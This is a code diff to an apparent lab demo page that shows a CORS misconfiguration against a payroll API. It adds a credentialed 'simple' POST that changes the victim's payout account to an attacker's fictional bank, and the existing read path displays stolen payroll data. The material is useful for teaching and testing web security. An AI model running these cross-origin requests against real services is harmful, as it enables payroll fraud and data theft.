@@ -24,7 +24,15 @@ const API_ORIGIN = API_ORIGINS[target];
 
 // `?mode=iframe` makes the read from inside a sandboxed frame instead of from this
 // document, so the browser sends `Origin: null` rather than this page's origin.
-const mode = params.get("mode") === "iframe" ? "iframe" : "direct";
+// `iframe`     — read from a sandboxed frame, so the browser sends `Origin: null`
+// `simplepost` — send a *simple* cross-origin POST, which triggers no preflight at all
+const MODES = ["iframe", "simplepost"];
+const requestedMode = params.get("mode");
+const mode = MODES.includes(requestedMode) ? requestedMode : "direct";
+
+//: The attacker's chosen destination for the victim's pay.
+const REDIRECTED_BANK = "Redirected Holdings (fictional)";
+const REDIRECTED_TAIL = "0001";
 
 const targetEl = document.getElementById("target");
 const statusEl = document.getElementById("status");
@@ -59,6 +67,7 @@ function renderLoot(data) {
     lootEl.append(dt, dd);
   }
   lootPanel.hidden = false;
+  document.body.dataset.payoutTail = data.payout_account.account_tail;
 }
 
 async function attempt() {
@@ -69,8 +78,19 @@ async function attempt() {
     });
 
     // Reaching this line means the browser released the response to this origin.
-    const data = await response.json();
     document.body.dataset.outcome = "released";
+    document.body.dataset.status = String(response.status);
+
+    if (!response.ok) {
+      // The cross-origin read succeeded — the misconfiguration is untouched — and there
+      // is simply nothing in it, because the browser did not send the session cookie.
+      statusEl.textContent = `The browser released the response (HTTP ${response.status}), and it carries no victim data: the session cookie was never sent.`;
+      detailEl.textContent = await response.text();
+      lootPanel.hidden = true;
+      return;
+    }
+
+    const data = await response.json();
     statusEl.textContent = `The browser released the response to this origin (HTTP ${response.status}). The victim's payroll data is now on an attacker's page.`;
     detailEl.textContent = "";
     renderLoot(data);
@@ -121,9 +141,37 @@ function runSandboxedFrame() {
   holder.replaceChildren(frame);
 }
 
+async function attemptSimplePost() {
+  // A *simple* request: a CORS-safelisted content type and no custom header. The browser
+  // sends no preflight for it — there is nothing to ask permission for, because the
+  // request is one an HTML form could already have made.
+  //
+  // Whether this page may read the answer is a CORS question. Whether the request
+  // *happens* is not, and never was.
+  try {
+    const response = await fetch(`${API_ORIGIN}/me/payout-account`, {
+      method: "POST",
+      credentials: "include",
+      headers: { "content-type": "text/plain;charset=UTF-8" },
+      body: JSON.stringify({ bank_name: REDIRECTED_BANK, account_tail: REDIRECTED_TAIL }),
+    });
+    document.body.dataset.outcome = "released";
+    document.body.dataset.status = String(response.status);
+    statusEl.textContent = `The browser released the response (HTTP ${response.status}).`;
+    detailEl.textContent = await response.text();
+  } catch (error) {
+    document.body.dataset.outcome = "blocked";
+    statusEl.textContent =
+      "The browser refused to give this page the response — which says nothing about whether the request was processed.";
+    detailEl.textContent = `${error.name}: ${error.message}`;
+  }
+}
+
 document.body.dataset.mode = mode;
 if (mode === "iframe") {
   runSandboxedFrame();
+} else if (mode === "simplepost") {
+  attemptSimplePost();
 } else {
   attempt();
 }
